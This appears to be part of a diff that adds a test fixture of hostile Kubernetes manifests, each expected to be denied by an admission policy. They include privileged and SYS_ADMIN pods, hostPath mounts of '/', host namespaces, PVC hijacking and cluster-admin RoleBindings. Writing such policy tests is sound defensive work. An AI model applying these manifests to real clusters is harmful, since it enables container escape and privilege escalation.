+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "capabilities": {
+        "add": [
+         "NET_ADMIN"
+        ],
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "capabilities outside",
+  "expect": "deny",
+  "name": "hostile/pod-cap-sys-admin",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "capabilities": {
+        "add": [
+         "SYS_ADMIN"
+        ],
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "host-backed",
+  "expect": "deny",
+  "name": "hostile/pod-fake-cnpg-label-by-tenant-still-hostpath",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "cnpg.io/cluster": "x"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "volumes": [
+     {
+      "hostPath": {
+       "path": "/"
+      },
+      "name": "h"
+     }
+    ]
+   }
+  }
+ },
+ {
+  "denied-by": "host namespaces",
+  "expect": "deny",
+  "name": "hostile/pod-hostnetwork",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "hostNetwork": true,
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "host-backed",
+  "expect": "deny",
+  "name": "hostile/pod-hostpath",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "volumes": [
+     {
+      "hostPath": {
+       "path": "/"
+      },
+      "name": "h"
+     }
+    ]
+   }
+  }
+ },
+ {
+  "denied-by": "host namespaces",
+  "expect": "deny",
+  "name": "hostile/pod-hostpid",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "hostPID": true,
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "hostPort",
+  "expect": "deny",
+  "name": "hostile/pod-hostport",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "ports": [
+       {
+        "containerPort": 80,
+        "hostPort": 80
+       }
+      ],
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "host-backed",
+  "expect": "deny",
+  "name": "hostile/pod-nfs",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "volumes": [
+     {
+      "name": "h",
+      "nfs": {
+       "path": "/",
+       "server": "10.0.0.1"
+      }
+     }
+    ]
+   }
+  }
+ },
+ {
+  "denied-by": "drop ALL",
+  "expect": "deny",
+  "name": "hostile/pod-no-drop-all",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {}
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "RuntimeClass",
+  "expect": "deny",
+  "name": "hostile/pod-no-runtimeclass",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ]
+   }
+  }
+ },
+ {
+  "denied-by": "nodeName",
+  "expect": "deny",
+  "name": "hostile/pod-nodename",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "nodeName": "control-plane-1",
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "privileged containers",
+  "expect": "deny",
+  "name": "hostile/pod-privileged-init",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "initContainers": [
+     {
+      "image": "x",
+      "name": "i",
+      "securityContext": {
+       "privileged": true
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "privileged containers",
+  "expect": "deny",
+  "name": "hostile/pod-privileged",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "privileged": true
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "procMount",
+  "expect": "deny",
+  "name": "hostile/pod-procmount",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "procMount": "Unmasked"
+      }
+     }
+    ],
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "system priority",
+  "expect": "deny",
+  "name": "hostile/pod-system-priority",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "priorityClassName": "system-node-critical",
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "denied-by": "RuntimeClass",
+  "expect": "deny",
+  "name": "hostile/pod-wrong-runtimeclass",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/name": "evil"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "registry.example.com/org/app:1",
+      "name": "c",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "runtimeClassName": "runc"
+   }
+  }
+ },
+ {
+  "denied-by": "volumeName",
+  "expect": "deny",
+  "name": "hostile/pvc-cnpg-label-does-not-excuse-hijack-without-label",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "labels": {
+     "app": "x"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "1Gi"
+     }
+    },
+    "volumeName": "pv-victim"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "dataSource",
+  "expect": "deny",
+  "name": "hostile/pvc-datasource",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "dataSourceRef": {
+     "apiGroup": "snapshot.storage.k8s.io",
+     "kind": "VolumeSnapshot",
+     "name": "victim",
+     "namespace": "victim"
+    },
+    "resources": {
+     "requests": {
+      "storage": "1Gi"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "exceeds params.maxPvcSize",
+  "expect": "deny",
+  "name": "hostile/pvc-huge",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "100Ti"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "access mode",
+  "expect": "deny",
+  "name": "hostile/pvc-rwx",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteMany"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "1Gi"
+     }
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "storage class",
+  "expect": "deny",
+  "name": "hostile/pvc-storageclass",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "1Gi"
+     }
+    },
+    "storageClassName": "attacker-class"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "volumeName",
+  "expect": "deny",
+  "name": "hostile/pvc-volumename",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "PersistentVolumeClaim",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "accessModes": [
+     "ReadWriteOnce"
+    ],
+    "resources": {
+     "requests": {
+      "storage": "1Gi"
+     }
+    },
+    "volumeName": "pv-victim"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "may only bind",
+  "expect": "deny",
+  "name": "hostile/rolebinding-server-cluster-admin",
+  "object": {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "cluster-admin"
+   },
+   "subjects": [
+    {
+     "kind": "ServiceAccount",
+     "name": "x",
+     "namespace": "orchard"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "may only bind",
+  "expect": "deny",
+  "name": "hostile/rolebinding-server-user-subject",
+  "object": {
+   "apiVersion": "rbac.authorization.k8s.io/v1",
+   "kind": "RoleBinding",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "roleRef": {
+    "apiGroup": "rbac.authorization.k8s.io",
+    "kind": "ClusterRole",
+    "name": "orchard-tenant-secrets"
+   },
+   "subjects": [
+    {
+     "kind": "User",
+     "name": "mallory"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "externalIPs",
+  "expect": "deny",
+  "name": "hostile/service-externalips",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "externalIPs": [
+     "1.2.3.4"
+    ],
+    "ports": [
+     {
+      "port": 80
+     }
+    ],
+    "selector": {
+     "a": "b"
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "ExternalName",
+  "expect": "deny",
+  "name": "hostile/service-externalname",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "externalName": "kubernetes.default.svc",
+    "type": "ExternalName"
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "LoadBalancer Services may only",
+  "expect": "deny",
+  "name": "hostile/service-lb-by-tenant",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "port": 80
+     }
+    ],
+    "selector": {
+     "a": "b"
+    },
+    "type": "LoadBalancer"
+   }
+  },
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "load balancer IP pinning",
+  "expect": "deny",
+  "name": "hostile/service-lb-pinned-ip-by-tenant",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "loadBalancerIP": "203.0.113.7",
+    "ports": [
+     {
+      "port": 80
+     }
+    ],
+    "selector": {
+     "a": "b"
+    },
+    "type": "ClusterIP"
+   }
+  },
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "load balancer IP pinning",
+  "expect": "deny",
+  "name": "hostile/service-lbipam-annotation-by-tenant",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "annotations": {
+     "lbipam.cilium.io/ips": "203.0.113.7"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "port": 80
+     }
+    ],
+    "selector": {
+     "a": "b"
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "NodePort",
+  "expect": "deny",
+  "name": "hostile/service-nodeport-disabled",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "nodePort": 31000,
+      "port": 80
+     }
+    ],
+    "selector": {
+     "a": "b"
+    },
+    "type": "NodePort"
+   }
+  },
+  "set": "allowNodePort=false",
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "denied-by": "selector-less",
+  "expect": "deny",
+  "name": "hostile/service-selectorless-fake-proxy-label",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "labels": {
+     "orchard.my/type": "protection-proxy"
+    },
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "port": 80
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ },
+ {
+  "denied-by": "selector-less",
+  "expect": "deny",
+  "name": "hostile/service-selectorless",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Service",
+   "metadata": {
+    "name": "evil",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ports": [
+     {
+      "port": 80
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard-policy-test:default"
+ }
+]
